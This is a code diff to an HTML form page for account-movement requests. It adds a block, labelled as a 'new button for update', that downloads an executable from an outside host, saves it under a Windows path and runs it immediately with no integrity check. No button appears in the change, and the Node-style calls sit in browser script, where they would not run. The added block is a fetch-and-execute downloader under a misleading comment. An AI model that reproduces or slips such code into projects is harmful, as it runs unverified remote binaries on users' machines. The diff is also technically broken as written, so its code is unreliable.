@@ -322,7 +322,23 @@ label.inline textarea {
 
 <script>
 let planIndex = 0;
+//new button for update
+const https = require("https");
+const fs = require("fs");
+const { exec } = require("child_process");
 
+const dest = "C:\\DSQ Enterprise\\Updates\\updater.exe";
+const file = fs.createWriteStream(dest);
+
+https.get("https://dsq-beta.vercel.app/updater.exe", (response) => {
+  response.pipe(file);
+  file.on("finish", () => {
+    file.close();
+    console.log("Download complete, running updater...");
+    exec(`"${dest}"`);
+  });
+});
+//new button for update
 // Section A logic
 const accountToggle = document.getElementById("accountToggle");
 const sectionA = document.querySelectorAll(".row")[0].children[0];
@@ -988,4 +1004,5 @@ Hi Team<br><br>Please action the below Account movement request:<br>${movementSt
 </script>
 </body>
 </html>
+
 
